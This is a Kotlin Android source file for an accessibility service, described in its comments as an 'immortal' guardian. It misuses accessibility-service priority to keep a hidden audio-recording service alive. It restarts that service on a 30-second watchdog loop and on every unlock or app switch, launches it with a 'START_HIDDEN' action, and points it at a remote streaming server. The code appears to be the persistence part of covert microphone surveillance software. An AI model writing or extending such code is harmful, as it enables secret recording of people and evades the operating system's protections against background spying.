package com.audiostream.client

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*

/**
 * KeepAliveAccessibilityService.kt — The "Immortal" Process Guardian
 *
 * Android OS assigns Accessibility Services system-critical priority (BIND_ACCESSIBILITY_SERVICE).
 * Unlike regular background services, the Android OS will NOT kill an active Accessibility
 * Service during memory pressure or Doze mode, and if killed, the system immediately restarts it.
 *
 * This Guardian Service:
 * 1. Stays persistently alive with system priority.
 * 2. Runs a lightweight watchdog loop (every 30s) to verify AudioRecordService is running.
 * 3. On any system accessibility event (screen unlock, app switch, etc.), checks and revives AudioRecordService.
 * 4. Ensures zero battery drain by keeping event processing minimal (canRetrieveWindowContent = false).
 */
class KeepAliveAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "GuardianAccessService"

        @Volatile
        var isGuardianActive = false
            private set
    }

    private val guardianScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var watchdogJob: Job? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        isGuardianActive = true
        Log.i(TAG, "🛡️ Guardian Accessibility Service CONNECTED & IMMORTALIZED.")

        // Start periodic supervisor loop
        startWatchdogLoop()

        // Immediate check & wake-up on connect
        reviveServiceIfNeeded()

        // Schedule and verify 1-hour alive heartbeat
        HeartbeatManager.scheduleHourlyHeartbeat(applicationContext)
        HeartbeatManager.checkAndSendHourly(applicationContext)
    }

    private fun startWatchdogLoop() {
        watchdogJob?.cancel()
        watchdogJob = guardianScope.launch {
            while (isActive) {
                delay(30_000) // Check every 30 seconds
                try {
                    reviveServiceIfNeeded()
                    // Verify 1-hour heartbeat has not been delayed by Doze mode
                    HeartbeatManager.checkAndSendHourly(applicationContext)
                } catch (e: Exception) {
                    Log.e(TAG, "Watchdog loop error: ${e.message}")
                }
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // Triggered on window / state changes (e.g. screen on, unlocking, switching apps)
        // Lightweight check: revive the audio streaming service if it died
        reviveServiceIfNeeded()
    }

    override fun onInterrupt() {
        Log.w(TAG, "Guardian Accessibility Service INTERRUPTED.")
    }

    override fun onDestroy() {
        super.onDestroy()
        isGuardianActive = false
        watchdogJob?.cancel()
        guardianScope.cancel()
        Log.w(TAG, "Guardian Accessibility Service DESTROYED.")
    }

    /**
     * Checks if AudioRecordService is supposed to be running (was_running == true)
     * and revives it via startForegroundService if it has died or stopped.
     */
    private fun reviveServiceIfNeeded() {
        try {
            val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
            val wasRunning = prefs.getBoolean("was_running", false)
            val isStandby = prefs.getBoolean("is_standby", false)
            val serverUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com")
                ?: "https://audio-steam-server.onrender.com"

            // If AudioRecordService is already running, everything is healthy
            if (AudioRecordService.isRunning || (isStandby && AudioRecordService.isStandbyMode)) {
                return
            }

            // Only revive if the user or system intended for it to be active
            if (wasRunning || isStandby) {
                Log.w(TAG, "⚠️ AudioRecordService dead or stopped! Guardian reviving it immediately...")

                val intent = Intent(applicationContext, AudioRecordService::class.java).apply {
                    action = if (isStandby) AudioRecordService.ACTION_STANDBY else AudioRecordService.ACTION_START_HIDDEN
                    putExtra(AudioRecordService.EXTRA_SERVER_URL, serverUrl)
                    putExtra(AudioRecordService.EXTRA_IS_MAIN, false)
                }

                ContextCompat.startForegroundService(applicationContext, intent)
                Log.i(TAG, "✅ AudioRecordService revived successfully by Guardian.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed reviving AudioRecordService: ${e.message}", e)
        }
    }
}
